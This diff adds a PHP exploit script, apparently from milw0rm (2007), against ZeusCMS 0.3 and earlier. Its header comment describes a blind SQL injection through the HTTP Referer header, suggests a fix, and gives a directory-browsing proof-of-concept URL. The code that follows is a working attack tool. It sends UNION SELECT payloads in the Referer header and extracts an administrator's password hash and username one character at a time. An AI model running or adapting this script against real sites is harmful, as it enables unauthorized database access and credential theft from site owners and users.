@@ -1,0 +1,152 @@
+<?
+
+/*
+	-------------------------------------------------
+	ZeusCMS <= 0.3 Remote Blind SQL Injection Exploit
+	------------------------------------------------- 
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.zeuscms.gr/
+	details..: works with magic_quotes_gpc = off (if magic quotes affects also $_SERVER array)
+
+	[-] Blind SQL Injection in /index.php :
+
+	129.	$blockedRefCheck=security::checkRef($_SERVER["HTTP_REFERER"]); <==
+	130.	
+	131.	if(@in_array($_SERVER['REMOTE_ADDR'],$blockedips) || $blockedRefCheck==TRUE){
+	132.		include "html_files/denied.html";
+	133.	}
+	134.	else
+
+	[-] checkRef() function defined in /security.php :
+
+	130.	function checkref($ref){
+	131.	  if($ref){
+	132.		$res=eregi_replace("http://","",$ref);
+	133.		include "dbase.php";
+	134.		$table=$prefix."referers";
+	135.		$res=$db->query("SELECT * FROM $table WHERE url like '%$ref%' AND status='BLOCKED'"); <==
+	136.		if($res->numRows()>0){
+	137.			return true;
+	138.		}
+	139.		else{
+	140.			return false;
+	141.		}
+	142.		}else{
+	143.      return false;
+	144.    }
+
+	an attacker can inject sql code through http referer header, that isn't properly checked...
+
+	[*] Possible bug fix in /index.php :
+
+	128.	$ref = security::safeGet($_SERVER["HTTP_REFERER"]);
+	129.	$blockedRefCheck = security::checkRef($ref);
+
+	[-] there is also a possible file system browsing through /image_viewer.php, p.o.c. :
+	
+	http://[host]/[path]/image_viewer.php?dir=/
+*/
+
+error_reporting(0);
+ini_set("default_socket_timeout", 5);
+set_time_limit(0);
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...";
+		$sock = fsockopen($host, 80);
+		sleep(1);
+	}
+	fputs($sock, $packet);
+	$resp = "";
+	while (!feof($sock)) $resp .= fread($sock, 1);
+	fclose($sock);
+	return $resp;
+}
+
+function check_query($sql)
+{
+	global $host, $path;
+	
+	$packet = "GET {$path} HTTP/1.1\r\n";
+	$packet.= "Host: {$host}\r\n";
+	$packet.= "Referer: {$sql} \r\n";
+	$packet.= "Keep-Alive: 300\r\n";
+	$packet.= "Connection: keep-alive\r\n\r\n";
+	$html	= http_send($host, $packet);
+	
+	return (preg_match("/DENIED/", $html) ? true : false);
+}
+
+print "\n+-----------------------------------------------------------+";
+print "\n| ZeusCMS <= 0.3 Remote Blind SQL Injection Exploit by EgiX |";
+print "\n+-----------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......:	php $argv[0] host path [prefix] [userid]\n";
+	print "\nhost.......:	target server (ip/hostname)";
+	print "\npath.......:	path to ZeusCMS directory (example: / or /zeuscms/)";
+	print "\nprefix.....:	table's prefix (default: ze)";
+	print "\nuserid.....:	user id (default: 1 - admin)\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+$pre  = (isset($argv[3]) ? $argv[3] : "ze");
+$uid  = (isset($argv[4]) ? $argv[4] : "1");
+
+$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+$index = 1; $md5 = "";
+print "\n[-] MD5 Hash: ";
+
+while (!strpos($md5, chr(0)))
+{
+	for ($i = 0; $i <= count($hash); $i++)
+	{
+  		if ($i == count($hash)) die("\n[-] Exploit failed...\n");
+
+		$sql =	"%'/**/AND/**/id=-1/**/UNION/**/SELECT/**/pwd,1,1,1/**/FROM/**/{$pre}_users/**/" .
+			"WHERE/**/id={$uid}/**/AND/**/ORD(SUBSTR(pwd,{$index},1))={$hash[$i]}/*";
+
+		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
+	}
+
+	$index++;
+}
+
+$char = array(0); // null char
+for ($j = 97; $j <= 122; $j++) $char = array_merge($char, array($j)); // a-z
+for ($j = 65; $j <= 90; $j++) $char = array_merge($char, array($j)); // A-Z
+for ($j = 48; $j <= 57; $j++) $char = array_merge($char, array($j)); // 0-9
+
+$index = 1; $user = "";
+print "\n[-] Username: ";
+
+while (!strpos($user, chr(0)))
+{
+	for ($i = 0; $i <= count($char); $i++)
+	{
+  		if ($i == count($char)) die("\n[-] Exploit failed...\n");
+
+		$sql =	"%'/**/AND/**/id=-1/**/UNION/**/SELECT/**/nickname,1,1,1/**/FROM/**/{$pre}_users/**/" .
+			"WHERE/**/id={$uid}/**/AND/**/ORD(SUBSTR(nickname,{$index},1))={$char[$i]}/*";
+
+		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; }
+	}
+
+	$index++;
+}
+
+print "\n\n[-] Successfull!\n";
+
+?>
+
+# milw0rm.com [2007-12-27]
